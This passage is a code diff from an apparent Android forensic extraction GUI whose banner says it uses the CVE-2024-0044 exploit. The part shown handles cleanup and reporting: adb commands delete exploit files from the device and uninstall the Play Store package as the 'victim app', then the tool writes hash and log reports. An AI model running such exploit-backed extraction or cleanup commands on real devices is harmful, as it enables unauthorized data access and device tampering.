+           if cleanup_result.returncode == 0:
+               self.write_log("APK removed from device", "SUCCESS")
+           else:
+               self.write_log("APK cleanup - file may not exist", "INFO")
+           
+           # Remove any exploit scripts
+           subprocess.run(
+               ["adb", "shell", "rm", "-f", "/data/local/tmp/exploit*"],
+               capture_output=True, timeout=10
+           )
+           
+           # Uninstall victim app
+           self.write_log("Uninstalling victim application...", "INFO")
+           uninstall_result = subprocess.run(
+               ["adb", "shell", "pm", "uninstall", "com.android.vending"],
+               capture_output=True, text=True, timeout=30
+           )
+           if "Success" in uninstall_result.stdout:
+               self.write_log("Victim app uninstalled successfully", "SUCCESS")
+           else:
+               self.write_log(f"Victim app uninstall status: {uninstall_result.stdout.strip()}", "INFO")
+           
+           # Generar reporte TXT con detalles específicos (Versión, Método, Fecha/Hora/Zona)
+           self.generate_extraction_report(package, self.extraction_dir)
+           
+           # PHASE 3: SAVE FORENSIC LOG (Renumbered from 4)
+           self.update_progress(9, 10, "Finalizing: Saving forensic log...")
+           self.write_log("\n▶ PHASE 3: SAVING FORENSIC LOG", "INFO")
+           log_file = self.save_log_to_file(self.extraction_dir)
+           
+           # COMPLETION
+           self.update_progress(10, 10, "✅ Forensic extraction complete!")
+           
+           self.write_log("\n" + "="*70, "INFO")
+           self.write_log("✅✅✅ FORENSIC EXTRACTION SUCCESSFUL!", "SUCCESS")
+           self.write_log("="*70, "INFO")
+           self.write_log(f"Standard: ISO/IEC 27037:2012", "INFO")
+           self.write_log(f"📁 Location: {os.path.abspath(self.extraction_dir)}", "INFO")
+           self.write_log(f"📄 TAR file: {tar_filename}", "INFO")
+           self.write_log(f"🔐 SHA256: {hash_value[:32]}...", "INFO")
+           self.write_log(f"📝 Log file: {os.path.basename(log_file) if log_file else 'Not saved'}", "INFO")
+           self.write_log("="*70, "INFO")
+           
+           # List all generated files
+           self.write_log("\n📂 Generated Files:", "SUCCESS")
+           for filename in os.listdir(self.extraction_dir):
+               filepath = os.path.join(self.extraction_dir, filename)
+               size = os.path.getsize(filepath)
+               self.write_log(f"   • {filename} ({size:,} bytes)", "INFO")
+           
+           # Update status
+           self.status_label.config(text="Status: Extraction Complete ✅", foreground=self.accent_green)
+           self.footer_progress_label.config(text=f"Data ready in: {os.path.basename(self.extraction_dir)}")
+           
+           self.last_extraction_dir = self.extraction_dir
+           
+           messagebox.showinfo("Extraction Complete",
+                             f"✅ Forensic extraction successful!\n\n"
+                             f"Standard: ISO/IEC 27037:2012\n"
+                             f"📄 TAR: {tar_filename}\n"
+                             f"🔐 SHA256: {hash_value[:32]}...\n"
+                             f"📝 Log: extraction_log.txt\n"
+                             f"📁 Location:\n{self.extraction_dir}\n\n"
+                             f"⚠️  IMPORTANT:\n"
+                             f"• Document in forensic report")
+       
+       except Exception as e:
+           self.write_log(f"CRITICAL ERROR: {e}", "ERROR")
+           import traceback
+           self.write_log(traceback.format_exc(), "ERROR")
+           
+           # Save log even on error
+           if self.extraction_dir:
+               self.save_log_to_file(self.extraction_dir)
+           
+           messagebox.showerror("Error", f"Critical error:\n{e}\n\nCheck log for details.")
+       
+       finally:
+           self.start_btn.config(state=tk.NORMAL, bg=self.accent_green)
+           self.update_progress(0, 10, "")
 
 
 def main():
-    root = tk.Tk()
-    app = AndroidExtractorGUI(root)
-    root.mainloop()
-
+   root = tk.Tk()
+   app = TraversoForensicsGUI(root)
+   root.mainloop()
 
 if __name__ == "__main__":
-    main()
+   print("="*70)
+   print("Traverso Forensics - Professional Extraction Suite v1.0")
+   print("Standard: ISO/IEC 27037:2012")
+   print("Exploit: CVE-2024-0044 (Payload Injection Method)")
+   print("="*70)
+   print("Starting application...")
+   print()
+   
+   root = tk.Tk()
+   app = TraversoForensicsGUI(root)
+   root.mainloop()
 
